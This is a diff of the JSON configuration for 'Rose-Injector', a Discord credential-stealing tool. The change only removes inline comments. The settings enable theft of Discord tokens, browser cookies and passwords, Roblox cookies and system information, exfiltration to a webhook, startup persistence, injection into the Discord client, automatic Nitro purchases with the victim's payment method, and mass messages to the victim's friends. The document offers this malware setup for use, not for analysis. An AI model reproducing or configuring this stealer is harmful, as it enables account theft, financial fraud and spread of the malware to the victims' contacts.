@@ -1,16 +1,16 @@
 {
-"HOOK": "WEBHOOK_HERE", # put your webhook in here
-"PING_METHOD": "NO_MESSAGE//NO_PING//EVERYONE//HERE", # choose between the three options
-"STARTUP": true, # move file to startup
-"INJECTION": true, # inject into the discord process
-"DISCORD_TOKEN_STEALING": true, # steal discord token
-"BROWSER_COOKIE_STEALING": true, # steal browser cookies
-"BROWSER_PASSWORD_STEALING": true, # steal browser passwords
-"ROBLOX_COOKIE_STEALING": true, # steal roblox cookie
-"SYSTEM_INFORMATION_STEALING": true, # send system information
-"AUTO_BUY_NITRO": true, \\ buy nitro automatically if payment added or already in account
-"MESSAGE_ALL_FRIENDS": true, # message all friends
-"MESSAGE_THAT_IS_BEING_SENT_TO_ALL_FRIENDS": "MESSAGE_HERE", # message that is sent to the friends \n for newline
+"HOOK": "WEBHOOK_HERE",
+"PING_METHOD": "NO_MESSAGE//NO_PING//EVERYONE//HERE",
+"STARTUP": true,
+"INJECTION": true,
+"DISCORD_TOKEN_STEALING": true,
+"BROWSER_COOKIE_STEALING": true,
+"BROWSER_PASSWORD_STEALING": true,
+"ROBLOX_COOKIE_STEALING": true,
+"SYSTEM_INFORMATION_STEALING": true,
+"AUTO_BUY_NITRO": true,
+"MESSAGE_ALL_FRIENDS": true,
+"MESSAGE_THAT_IS_BEING_SENT_TO_ALL_FRIENDS": "MESSAGE_HERE",
 
 "EB_FOOTER": "Rose-Injector | Made by Gumbobrot, ICExFS, suegdu | https://github.com/DamagingRose/Rose-Injector/",
 "EB_COLOR": 16711680,
